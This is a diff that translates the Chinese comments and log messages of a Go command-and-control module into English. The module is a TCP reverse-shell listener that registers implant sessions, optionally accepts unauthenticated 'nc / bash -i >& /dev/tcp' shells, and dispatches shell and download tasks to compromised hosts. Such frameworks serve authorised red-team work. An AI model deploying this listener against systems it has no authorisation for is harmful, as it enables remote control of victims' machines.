@@ -1,4 +1,4 @@
-﻿package c2
+package c2
 
 import (
 	"bufio"
@@ -19,10 +19,10 @@ import (
 	"go.uber.org/zap"
 )
 
-// TCPReverseListener 监听 TCP 端口，等待目标机反弹连接。
-// 默认仅接受加密 TCP Beacon：连接后先发送魔数 CSB1，再经 AES-GCM 解密且校验 ImplantToken 后才登记会话。
-// 可选经典模式（config.allow_legacy_shell=true）：纯交互式 raw shell，与 nc / bash -i >& /dev/tcp 兼容，无鉴权，仅建议内网实验。
-// 任务派发（经典模式）：同步 exec —— 收到 task 时直接 send 命令字节并读取输出（带结束标记）。
+// TCPReverseListener listens on a TCP port, waiting for target machines to connect back.
+// By default only accepts encrypted TCP Beacon: after connecting, first sends magic number CSB1, then AES-GCM decrypts and verifies ImplantToken before registering the session.
+// Optional classic mode (config.allow_legacy_shell=true): pure interactive raw shell, compatible with nc / bash -i >& /dev/tcp, no authentication, recommended for internal network experiments only.
+// Task dispatch (classic mode): synchronous exec — directly sends command bytes and reads output (with end marker) when a task is received.
 type TCPReverseListener struct {
 	rec     *database.C2Listener
 	cfg     *ListenerConfig
@@ -32,20 +32,20 @@ type TCPReverseListener struct {
 	mu        sync.Mutex
 	listener  net.Listener
 	stopCh    chan struct{}
-	conns     map[string]*tcpReverseConn // session_id → 连接
+	conns     map[string]*tcpReverseConn // session_id → connection
 	stopOnce  sync.Once
 }
 
-// tcpReverseConn 单个反弹会话的运行时状态
+// tcpReverseConn is the runtime status of a single reverse shell session
 type tcpReverseConn struct {
 	sessionID string
 	conn      net.Conn
 	reader    *bufio.Reader
-	writeMu   sync.Mutex // 序列化 write，避免并发 task 写入
-	taskMode  int32      // 原子标志: 0=空闲(handleConn读), 1=任务中(runTaskOnConn独占读)
+	writeMu   sync.Mutex // serialize writes to avoid concurrent task writes
+	taskMode  int32      // atomic flag: 0=idle (handleConn reading), 1=in-task (runTaskOnConn has exclusive read)
 }
 
-// NewTCPReverseListener 工厂方法（注册到 ListenerRegistry["tcp_reverse"]）
+// NewTCPReverseListener is the factory method (registered to ListenerRegistry["tcp_reverse"])
 func NewTCPReverseListener(ctx ListenerCreationCtx) (Listener, error) {
 	return &TCPReverseListener{
 		rec:     ctx.Listener,
@@ -57,10 +57,10 @@ func NewTCPReverseListener(ctx ListenerCreationCtx) (Listener, error) {
 	}, nil
 }
 
-// Type 返回类型常量
+// Type returns the type constant
 func (l *TCPReverseListener) Type() string { return string(ListenerTypeTCPReverse) }
 
-// Start 启动 TCP 监听，accept 在独立 goroutine 中运行
+// Start starts TCP listening; accept runs in an independent goroutine
 func (l *TCPReverseListener) Start() error {
 	addr := fmt.Sprintf("%s:%d", l.rec.BindHost, l.rec.BindPort)
 	ln, err := net.Listen("tcp", addr)
@@ -78,7 +78,7 @@ func (l *TCPReverseListener) Start() error {
 	return nil
 }
 
-// Stop 关闭监听 + 所有活动连接
+// Stop closes the listener and all active connections
 func (l *TCPReverseListener) Stop() error {
 	l.stopOnce.Do(func() {
 		close(l.stopCh)
@@ -114,14 +114,14 @@ func (l *TCPReverseListener) acceptLoop() {
 			if isClosedConnErr(err) {
 				return
 			}
-			l.logger.Warn("tcp_reverse accept 失败", zap.Error(err))
+			l.logger.Warn("tcp_reverse accept failed", zap.Error(err))
 			continue
 		}
 		go l.handleConn(conn)
 	}
 }
 
-// handleConn 先识别加密 TCP Beacon（魔数 CSB1 + AES-GCM + Token）；未通过则按配置拒绝或走经典 shell。
+// handleConn first identifies encrypted TCP Beacon (magic CSB1 + AES-GCM + Token); if it fails, either rejects or falls back to classic shell depending on config.
 func (l *TCPReverseListener) handleConn(conn net.Conn) {
 	br := bufio.NewReader(conn)
 	remote := conn.RemoteAddr().String()
@@ -139,7 +139,7 @@ func (l *TCPReverseListener) handleConn(conn net.Conn) {
 	}
 
 	if !l.cfg.AllowLegacyShell {
-		l.logger.Debug("tcp_reverse 拒绝未加密连接", zap.String("remote", remote))
+		l.logger.Debug("tcp_reverse rejected unencrypted connection", zap.String("remote", remote))
 		_ = conn.Close()
 		return
 	}
@@ -148,12 +148,12 @@ func (l *TCPReverseListener) handleConn(conn net.Conn) {
 	l.handleShellConn(conn, br)
 }
 
-// handleShellConn 经典裸 TCP 反弹 shell（与 nc/bash /dev/tcp 兼容）；需监听器显式开启 allow_legacy_shell。
+// handleShellConn handles classic raw TCP reverse shell (compatible with nc/bash /dev/tcp); requires allow_legacy_shell to be explicitly enabled on the listener.
 func (l *TCPReverseListener) handleShellConn(conn net.Conn, br *bufio.Reader) {
 	remote := conn.RemoteAddr().String()
 	host, _, _ := net.SplitHostPort(remote)
 
-	// 用 listener+remote_ip 生成稳定 implant_uuid，使同一来源的重连复用同一会话
+	// generate a stable implant_uuid from listener+remote_ip so reconnections from the same source reuse the same session
 	uuidSeed := fmt.Sprintf("%s|%s", l.rec.ID, host)
 	hash := sha256.Sum256([]byte(uuidSeed))
 	implantUUID := hex.EncodeToString(hash[:8])
@@ -165,7 +165,7 @@ func (l *TCPReverseListener) handleShellConn(conn net.Conn, br *bufio.Reader) {
 		OS:            "unknown",
 		Arch:          "unknown",
 		InternalIP:    host,
-		SleepSeconds:  0, // 交互式不需要 sleep
+		SleepSeconds:  0, // interactive mode does not need sleep
 		JitterPercent: 0,
 		Metadata: map[string]interface{}{
 			"transport": "tcp_reverse",
@@ -174,7 +174,7 @@ func (l *TCPReverseListener) handleShellConn(conn net.Conn, br *bufio.Reader) {
 	}
 	session, err := l.manager.IngestCheckIn(l.rec.ID, checkin)
 	if err != nil {
-		l.logger.Warn("tcp_reverse 登记会话失败", zap.Error(err))
+		l.logger.Warn("tcp_reverse register session failed", zap.Error(err))
 		_ = conn.Close()
 		return
 	}
@@ -201,8 +201,8 @@ func (l *TCPReverseListener) handleShellConn(conn net.Conn, br *bufio.Reader) {
 		_ = conn.Close()
 	}()
 
-	// 主循环：检测连接存活 + 读取非任务期间的 unsolicited 输出
-	// 注意：必须统一使用 tc.reader 读取，避免与 runTaskOnConn 的 bufio.Reader 产生数据分裂
+	// main loop: detect connection liveness + read unsolicited output when no task is running
+	// Note: must use tc.reader uniformly to avoid data splitting with runTaskOnConn's bufio.Reader
 	buf := make([]byte, 4096)
 	for {
 		select {
@@ -210,7 +210,7 @@ func (l *TCPReverseListener) handleShellConn(conn net.Conn, br *bufio.Reader) {
 			return
 		default:
 		}
-		// 任务执行中，runTaskOnConn 独占读取权，主循环暂停
+		// Task executing; runTaskOnConn has exclusive read; main loop pauses
 		if atomic.LoadInt32(&tc.taskMode) == 1 {
 			time.Sleep(100 * time.Millisecond)
 			continue
@@ -218,7 +218,7 @@ func (l *TCPReverseListener) handleShellConn(conn net.Conn, br *bufio.Reader) {
 		_ = conn.SetReadDeadline(time.Now().Add(60 * time.Second))
 		n, err := tc.reader.Read(buf)
 		if n > 0 {
-			// 收到数据也刷新心跳
+			// receiving data also refreshes the heartbeat
 			_ = l.manager.DB().TouchC2Session(session.ID, string(SessionActive), time.Now())
 			if atomic.LoadInt32(&tc.taskMode) == 0 {
 				l.manager.publishEvent("info", "task", session.ID, "",
@@ -232,7 +232,7 @@ func (l *TCPReverseListener) handleShellConn(conn net.Conn, br *bufio.Reader) {
 				return
 			}
 			if ne, ok := err.(net.Error); ok && ne.Timeout() {
-				// 读超时 = 连接仍存活但无数据，刷新心跳防止看门狗误判
+				// read timeout = connection still alive but no data; refresh heartbeat to prevent watchdog false positives
 				_ = l.manager.DB().TouchC2Session(session.ID, string(SessionActive), time.Now())
 				continue
 			}
@@ -241,7 +241,7 @@ func (l *TCPReverseListener) handleShellConn(conn net.Conn, br *bufio.Reader) {
 	}
 }
 
-// taskDispatcherLoop 周期扫描所有活动会话的任务队列，下发 exec/shell 类型的同步命令
+// TaskDispatcherLoop periodically scans all active sessions' task queues and dispatches synchronous exec/shell commands
 func (l *TCPReverseListener) taskDispatcherLoop() {
 	t := time.NewTicker(500 * time.Millisecond)
 	defer t.Stop()
@@ -269,23 +269,23 @@ func (l *TCPReverseListener) taskDispatcherLoop() {
 	}
 }
 
-// runTaskOnConn 把一条 task 转成 raw shell 命令发送，通过结束标记读输出
+// runTaskOnConn converts a task into a raw shell command, sends it, and reads the output until the end marker
 func (l *TCPReverseListener) runTaskOnConn(c *tcpReverseConn, env TaskEnvelope) {
 	startedAt := NowUnixMillis()
 	cmd, ok := buildTCPCommand(TaskType(env.TaskType), env.Payload)
 	if !ok {
-		l.reportTaskResult(env.TaskID, startedAt, false, "", "tcp_reverse listener 不支持该任务类型: "+env.TaskType, "", "")
+		l.reportTaskResult(env.TaskID, startedAt, false, "", "tcp_reverse listener does not support this task type: "+env.TaskType, "", "")
 		return
 	}
 
-	// 独占读取权：通知 handleConn 主循环暂停
+	// exclusive read: notify handleConn main loop to pause
 	atomic.StoreInt32(&c.taskMode, 1)
 	defer atomic.StoreInt32(&c.taskMode, 0)
 
-	// 等待 handleConn 循环退出读取（给 100ms 让正在进行的 Read 超时/完成）
+	// wait for handleConn loop to exit read (give 100ms for ongoing Read to timeout/complete)
 	time.Sleep(150 * time.Millisecond)
 
-	// 排空 buffer 中残留的 bash 提示符等数据
+	// drain residual bash prompts and other data from the buffer
 	drainStaleData(c.reader, c.conn)
 
 	endMark := fmt.Sprintf("__C2_DONE_%s__", env.TaskID)
@@ -294,7 +294,7 @@ func (l *TCPReverseListener) runTaskOnConn(c *tcpReverseConn, env TaskEnvelope) 
 	_ = c.conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
 	if _, err := c.conn.Write([]byte(wrapped)); err != nil {
 		c.writeMu.Unlock()
-		l.reportTaskResult(env.TaskID, startedAt, false, "", "写命令失败: "+err.Error(), "", "")
+		l.reportTaskResult(env.TaskID, startedAt, false, "", "write command failed: "+err.Error(), "", "")
 		return
 	}
 	c.writeMu.Unlock()
@@ -303,7 +303,7 @@ func (l *TCPReverseListener) runTaskOnConn(c *tcpReverseConn, env TaskEnvelope) 
 	defer cancel()
 	output, err := readUntilMarker(ctx, c.reader, endMark)
 	if err != nil {
-		l.reportTaskResult(env.TaskID, startedAt, false, output, "读取结果失败: "+err.Error(), "", "")
+		l.reportTaskResult(env.TaskID, startedAt, false, output, "read result failed: "+err.Error(), "", "")
 		return
 	}
 	cleaned := cleanShellOutput(output, cmd)
@@ -316,7 +316,7 @@ func (l *TCPReverseListener) runTaskOnConn(c *tcpReverseConn, env TaskEnvelope) 
 	l.reportTaskResult(env.TaskID, startedAt, true, cleaned, "", "", "")
 }
 
-// reportTaskResult 适配 Manager.IngestTaskResult，统一报告路径
+// reportTaskResult adapts Manager.IngestTaskResult for a unified reporting path
 func (l *TCPReverseListener) reportTaskResult(taskID string, startedAtMS int64, success bool, output, errMsg, blobB64, blobSuffix string) {
 	_ = l.manager.IngestTaskResult(TaskResultReport{
 		TaskID:     taskID,
@@ -330,9 +330,9 @@ func (l *TCPReverseListener) reportTaskResult(taskID string, startedAtMS int64, 
 	})
 }
 
-// buildTCPCommand 把 (TaskType + payload) 转成 raw shell 命令字符串。
-// 仅支持 TCP 反弹模式可直接执行的最简任务类型；download 通过 base64 输出文本结果，
-// upload/screenshot 等需要二进制传输的能力建议使用 http_beacon。
+// buildTCPCommand converts (TaskType + payload) into a raw shell command string.
+// Only supports the simplest task types executable in TCP reverse mode; download outputs text result via base64,
+// capabilities requiring binary transfer such as upload/screenshot are recommended to use http_beacon.
 func buildTCPCommand(t TaskType, payload map[string]interface{}) (string, bool) {
 	switch t {
 	case TaskTypeExec, TaskTypeShell:
@@ -376,7 +376,7 @@ func buildTCPCommand(t TaskType, payload map[string]interface{}) (string, bool) 
 	return "", false
 }
 
-// readUntilMarker 从 reader 持续读，直到匹配 endMarker；返回去掉标记后的输出
+// readUntilMarker reads continuously from the reader until endMarker is matched; returns output with the marker removed
 func readUntilMarker(ctx context.Context, r *bufio.Reader, marker string) (string, error) {
 	var sb strings.Builder
 	buf := make([]byte, 4096)
@@ -407,7 +407,7 @@ func shellQuote(s string) string {
 	return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
 }
 
-// detectDownloadShellError 识别 download 任务中 shell/base64 返回的错误信息。
+// detectDownloadShellError identifies error information returned by shell/base64 in a download task.
 func detectDownloadShellError(output string) string {
 	trimmed := strings.TrimSpace(output)
 	if trimmed == "" {
@@ -447,7 +447,7 @@ func isClosedConnErr(err error) bool {
 		strings.Contains(es, "connection reset by peer")
 }
 
-// drainStaleData 用短超时读取并丢弃 buffer 中残留的 shell 提示符等数据
+// drainStaleData reads and discards residual shell prompts and other data in the buffer using a short timeout
 func drainStaleData(r *bufio.Reader, conn net.Conn) {
 	buf := make([]byte, 4096)
 	for {
@@ -457,13 +457,13 @@ func drainStaleData(r *bufio.Reader, conn net.Conn) {
 			break
 		}
 	}
-	// 恢复较长的读超时
+	// restore to longer read timeout
 	_ = conn.SetReadDeadline(time.Time{})
 }
 
 var shellPromptRe = regexp.MustCompile(`(?m)^.*?(bash[\-\d.]*\$|[\$#%>]\s*)$`)
 
-// cleanShellOutput 过滤 bash 提示符行和命令回显，返回干净的命令输出
+// cleanShellOutput filters bash prompt lines and command echoes, returning clean command output
 func cleanShellOutput(raw, cmd string) string {
 	lines := strings.Split(raw, "\n")
 	var cleaned []string
@@ -471,12 +471,12 @@ func cleanShellOutput(raw, cmd string) string {
 	echoSkipped := false
 	for _, line := range lines {
 		trimmed := strings.TrimRight(line, "\r \t")
-		// 跳过命令回显行（bash 会 echo 回输入的命令）
+		// skip command echo lines (bash echoes back the entered command)
 		if !echoSkipped && cmdTrimmed != "" && strings.Contains(trimmed, cmdTrimmed) {
 			echoSkipped = true
 			continue
 		}
-		// 跳过纯 shell 提示符行
+		// skip pure shell prompt lines
 		if shellPromptRe.MatchString(trimmed) && len(strings.TrimSpace(shellPromptRe.ReplaceAllString(trimmed, ""))) == 0 {
 			continue
 		}
